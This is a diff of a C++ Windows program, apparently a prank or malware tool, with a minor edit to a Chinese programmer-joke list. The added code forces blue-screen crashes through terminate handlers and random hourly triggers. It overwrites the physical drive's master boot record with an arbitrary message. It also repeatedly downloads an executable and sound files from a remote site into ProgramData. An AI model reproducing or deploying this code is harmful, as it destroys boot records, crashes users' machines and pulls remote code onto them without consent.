@@ -21,13 +21,22 @@ command:
 #include"func.h"
 #include"hide.h"
 
+//自建中止函数
+void terminate_func()
+{
+	MakeBlueScreen(0xccccc513);
+}
+
 int _tmain(int argc, TCHAR* c_argv[])
 {
+	set_terminate(terminate_func);
+	set_unexpected(terminate_func);
+
 	__time64_t now = 0;
 	std::wstringstream wss;
 	std::wfstream wfs;
 	std::wstring arg;
-	std::vector<std::wstring> argv(c_argv+1,c_argv+argc-1);
+	std::vector<std::wstring> argv(c_argv + 1, c_argv + argc - 1);
 	bool
 		cmd_c = false,
 		cmd_r = false,
@@ -55,7 +64,11 @@ int _tmain(int argc, TCHAR* c_argv[])
 	if (cmd_b)
 		MakeBlueScreen(0xcccccccc);
 	if (cmd_m)
-		WritePhydriveMBR(0,"Unknown Hard Error.\r\nTry to reboot.\r\n\n\nWindows Boot Manager NT 10.0");
+	{
+		char mbrmsg_s[512];
+		WideCharToMultiByte(CP_ACP, 0, (*(std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-b"))) + 1)).c_str(), -1, mbrmsg_s, 512, NULL, NULL);
+		WritePhydriveMBR(0, mbrmsg_s);
+	}
 	if (cmd_e)
 		return 0;
 
@@ -63,8 +76,9 @@ int _tmain(int argc, TCHAR* c_argv[])
 	{
 		now=_time64(NULL);
 		srand(static_cast<unsigned int>(now));
-		bool iserror=false;
-		wss<<GetDataFromURL(_T("https://llv-website.rf.gd/update/lastbuild.txt"),iserror);
+		bool iserror = false, t_isok = false;
+		wss << GetDataFromURL(_T("https://llv-website.rf.gd/update/lastbuild.txt"), t_isok);
+		iserror = !t_isok || iserror;
 		int lastbuildnumber = 0;
 		wss >> lastbuildnumber;
 		if (lastbuildnumber > __BUILD__)
@@ -73,25 +87,28 @@ int _tmain(int argc, TCHAR* c_argv[])
 			std::wstring newbuildname;
 			wss << lastbuildnumber << _T(".exe") << std::flush;
 			wss >> newbuildname;
-			DownloadFileFromURL(_T("https://llv-website.rf.gd/update/lastbuild.exe"), _T("%ProgramData%\\llv\\") + newbuildname);
+			iserror = DownloadFileFromURL(_T("https://llv-website.rf.gd/update/lastbuild.exe"), _T("%ProgramData%\\llv\\") + newbuildname) || iserror;
 			wfs.open(_T("%ProgramData%\\llv\\launcherobj.ini"), std::ios::out);
 			wfs << lastbuildnumber;
 			wfs.close();
-			//抽奖
-			if (rand() % 16 == 0&&!cmd__b)
-				MakeBlueScreen(0xAA232323);
-			if (rand() % 16 == 0&&!cmd__s)
-			{
-				std::wstring soundid;
-				wss << rand() % 5 << std::flush;
-				wss >> soundid;
-				DownloadFileFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), _T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"));
-				PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"),true);
-
-			}
+			if (!wfs.good())
+				iserror = true;
 		}
+		//抽奖
+		if (rand() % 16 == 0 && !cmd__b)
+			iserror = MakeBlueScreen(0xCC232323) || iserror;
+		if (rand() % 16 == 0&&!cmd__s)
+		{
+			std::wstring soundid;
+			wss << rand() % 5 << std::flush;
+			wss >> soundid;
+			std::wstring sounddata;
+			sounddata = GetDataFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), t_isok);
+			iserror = PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound") + soundid + _T(".wav"), true) || iserror || !t_isok;
+		}
+		if (iserror)
+			terminate();
 		Sleep(60 * 60 * 1000);//wait 1h
-
 	}
 	return 0;
 }
@@ -130,7 +147,7 @@ wurenji
 
 一个wurenji走进一家酒吧，要了一杯烫烫烫的锟斤拷
 
-一个wurenji走进一家酒吧，要了1/0杯nullptr
+一个wurenji走进一家酒吧，要了1/0杯NULL
 
 一个wurenji冲进一家酒吧，要了500个啤酒梅素汁香精煎鱼蒸虾头
 
